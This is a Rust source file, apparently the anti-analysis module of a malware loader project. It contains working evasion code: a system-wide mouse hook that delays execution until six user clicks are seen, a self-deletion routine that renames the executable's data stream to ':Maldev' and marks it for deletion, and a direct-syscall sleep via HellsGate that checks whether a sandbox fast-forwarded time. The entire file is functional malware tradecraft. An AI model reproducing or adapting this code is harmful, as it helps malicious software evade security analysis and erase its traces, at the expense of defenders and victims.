//! Anti-analysis techniques:
//!   - MouseClicksLogger  — waits for ≥6 mouse clicks in a time window (sandbox check)
//!   - DeleteSelf         — renames the ADS stream then marks the file for deletion
//!   - DelayExecutionVia_NtDE — direct-syscall sleep with elapsed-time verification
//!
//! Only compiled when the `anti_analysis` feature is enabled.

#![allow(dead_code, unused_imports, non_snake_case)]

use crate::types::*;

// ---------------------------------------------------------------------------
// Local constants not already defined in types.rs
// ---------------------------------------------------------------------------
const HC_ACTION: i32 = 0;
const WM_LBUTTONDOWN: usize = 0x0201;
const WM_RBUTTONDOWN: usize = 0x0204;
const DELETE: u32 = 0x00010000;
const OPEN_EXISTING: u32 = 3;
const FILE_SHARE_WRITE: u32 = 0x00000002;
const FILE_SHARE_DELETE: u32 = 0x00000004;
const FILE_RENAME_INFO_CLASS: i32 = 3;
const FILE_DISPOSITION_INFO_CLASS: i32 = 4;
const MAX_PATH: usize = 260;

// ---------------------------------------------------------------------------
// Local MSG definition (not in types.rs)
// ---------------------------------------------------------------------------
#[repr(C)]
struct Msg {
    hwnd:      HWND,    // 8 bytes
    message:   u32,     // 4 bytes
    _pad:      u32,     // 4 bytes padding (aligns wParam to 8-byte boundary)
    wparam:    WPARAM,  // 8 bytes
    lparam:    LPARAM,  // 8 bytes
    time:      u32,     // 4 bytes
    pt_x:      i32,     // 4 bytes
    pt_y:      i32,     // 4 bytes
    l_private: u32,     // 4 bytes
    // Total: 48 bytes — matches Windows x64 MSG layout
}

// ---------------------------------------------------------------------------
// GetTickCount — imported directly (benign IAT entry; already in iat_camouflage)
// ---------------------------------------------------------------------------
extern "system" {
    fn GetTickCount() -> u32;
}

// ---------------------------------------------------------------------------
// Mouse hook globals
// ---------------------------------------------------------------------------
static mut G_HOOK:   HHOOK = core::ptr::null_mut();
static mut G_CLICKS: i32   = 0;

/// Low-level mouse hook callback.  Counts left- and right-button-down events.
unsafe extern "system" fn mouse_hook_proc(
    code:   i32,
    wparam: WPARAM,
    lparam: LPARAM,
) -> LRESULT {
    if code == HC_ACTION && (wparam == WM_LBUTTONDOWN || wparam == WM_RBUTTONDOWN) {
        G_CLICKS += 1;
    }
    (crate::inject::G_API.call_next_hook_ex.unwrap())(G_HOOK, code, wparam, lparam)
}

// ---------------------------------------------------------------------------
// MouseClicksLogger
// ---------------------------------------------------------------------------

/// Install a low-level mouse hook and pump messages for up to `ms` milliseconds.
/// Returns `true` if at least 6 clicks were recorded (real user interaction).
unsafe fn mouse_clicks_logger(ms: u32) -> bool {
    G_CLICKS = 0;

    G_HOOK = (crate::inject::G_API.set_windows_hook_ex_w.unwrap())(
        WH_MOUSE_LL,
        mouse_hook_proc as HOOKPROC,
        core::ptr::null_mut(),  // hMod  (NULL for system-wide LL hook)
        0,                      // dwThreadId (0 = all threads)
    );
    if G_HOOK.is_null() {
        return false;
    }

    let mut msg: Msg = core::mem::zeroed();
    let start = GetTickCount();

    while GetTickCount().wrapping_sub(start) < ms {
        if G_CLICKS >= 6 {
            break;
        }
        // GetMessageW signature in ApiHashing uses *mut [u8; 48]
        let ret = (crate::inject::G_API.get_message_w.unwrap())(
            &mut msg as *mut Msg as *mut [u8; 48],
            core::ptr::null_mut(),  // hwnd (NULL = all windows)
            0,                      // wMsgFilterMin
            0,                      // wMsgFilterMax
        );
        if ret > 0 {
            (crate::inject::G_API.def_window_proc_w.unwrap())(
                msg.hwnd,
                msg.message,
                msg.wparam,
                msg.lparam,
            );
        }
    }

    (crate::inject::G_API.unhook_windows_hook_ex.unwrap())(G_HOOK);
    G_HOOK = core::ptr::null_mut();

    G_CLICKS >= 6
}

// ---------------------------------------------------------------------------
// DeleteSelf
// ---------------------------------------------------------------------------

/// Rename the current executable's default ADS to `:Maldev`, then mark it for
/// deletion.  Uses `SetFileInformationByHandle` for both steps.
unsafe fn delete_self() -> bool {
    // Resolve current executable path.
    let mut path: [u16; MAX_PATH] = [0u16; MAX_PATH];
    let len = (crate::inject::G_API.get_module_file_name_w.unwrap())(
        core::ptr::null_mut(),  // hModule NULL → current exe
        path.as_mut_ptr(),
        MAX_PATH as u32,
    );
    if len == 0 {
        return false;
    }

    // --- Step 1: rename :$DATA stream to :Maldev ---
    let h_file = (crate::inject::G_API.create_file_w.unwrap())(
        path.as_ptr(),
        DELETE | SYNCHRONIZE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        core::ptr::null_mut(),  // lpSecurityAttributes
        OPEN_EXISTING,
        0,                      // dwFlagsAndAttributes
        core::ptr::null_mut(),  // hTemplateFile
    );
    if h_file == INVALID_HANDLE_VALUE {
        return false;
    }

    // Build FILE_RENAME_INFO.  file_name holds ":Maldev\0" as u16 values.
    // file_name_length = 7 chars * 2 bytes = 14 (length in bytes, NOT counting null).
    let mut fri: FileRenameInfo = core::mem::zeroed();
    fri.replace_if_exists = 0;       // FALSE
    fri.root_directory    = core::ptr::null_mut();
    fri.file_name_length  = 14;      // 7 wide chars × 2 bytes
    fri.file_name = [
        ':' as u16,
        'M' as u16,
        'a' as u16,
        'l' as u16,
        'd' as u16,
        'e' as u16,
        'v' as u16,
        0u16,
        0u16,
    ];

    let fri_size = core::mem::size_of::<FileRenameInfo>() as u32;
    (crate::inject::G_API.set_file_information_by_handle.unwrap())(
        h_file,
        FILE_RENAME_INFO_CLASS,
        &mut fri as *mut FileRenameInfo as *mut u8,
        fri_size,
    );
    (crate::inject::G_API.close_handle.unwrap())(h_file);

    // --- Step 2: reopen and mark for deletion ---
    let h_file2 = (crate::inject::G_API.create_file_w.unwrap())(
        path.as_ptr(),
        DELETE | SYNCHRONIZE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        core::ptr::null_mut(),
        OPEN_EXISTING,
        0,
        core::ptr::null_mut(),
    );
    if h_file2 == INVALID_HANDLE_VALUE {
        return false;
    }

    let mut fdi: FileDispositionInfo = FileDispositionInfo { delete_file: 1 };
    (crate::inject::G_API.set_file_information_by_handle.unwrap())(
        h_file2,
        FILE_DISPOSITION_INFO_CLASS,
        &mut fdi as *mut FileDispositionInfo as *mut u8,
        core::mem::size_of::<FileDispositionInfo>() as u32,
    );
    (crate::inject::G_API.close_handle.unwrap())(h_file2);

    true
}

// ---------------------------------------------------------------------------
// DelayExecutionVia_NtDE
// ---------------------------------------------------------------------------

/// Sleep for `minutes` minutes via a direct NtDelayExecution syscall.
/// Verifies that real wall-clock time passed (sandbox fast-forward detection).
///
/// Returns `true` if the delay completed normally and time advanced as expected.
unsafe fn delay_execution_via_nt_de(minutes: f64) -> bool {
    // Timeout in 100-nanosecond intervals, negative = relative.
    let delay: i64 = -((minutes * 60.0 * 1000.0 * 10000.0) as i64);

    let start_tick     = GetTickCount();
    let expected_end   = start_tick.wrapping_add((minutes * 60.0 * 1000.0) as u32);

    // Arm + call NtDelayExecution through HellsGate/HellDescent.
    crate::syscall::HellsGate(crate::inject::G_SYS.nt_delay_execution.ssn);
    type NtDelayExecution = unsafe extern "system" fn(BOOL, *const i64) -> NTSTATUS;
    let f: NtDelayExecution =
        core::mem::transmute(crate::syscall::HellDescent as *const ());
    let status: NTSTATUS = f(0 /* Alertable=FALSE */, &delay);

    if status != STATUS_SUCCESS {
        return false;
    }

    // Anti-sandbox: if the system tick counter didn't advance enough, a
    // sandbox accelerated the sleep.
    if GetTickCount() < expected_end {
        return false;
    }

    true
}

// ---------------------------------------------------------------------------
// Public entry point
// ---------------------------------------------------------------------------

/// Run all anti-analysis checks.
///
/// 1. Delete self (ADS rename + disposition).
/// 2. Repeat mouse-click check up to 10 times; stop early on success.
/// 3. Short NtDelayExecution (≈6 s) with elapsed-time verification.
///
/// # Safety
/// All `G_API` / `G_SYS` function pointers must be resolved before this call.
pub unsafe fn run(ms: u32) {
    delete_self();

    for _ in 0..10 {
        if mouse_clicks_logger(ms) {
            break;
        }
    }

    delay_execution_via_nt_de(0.1);
}
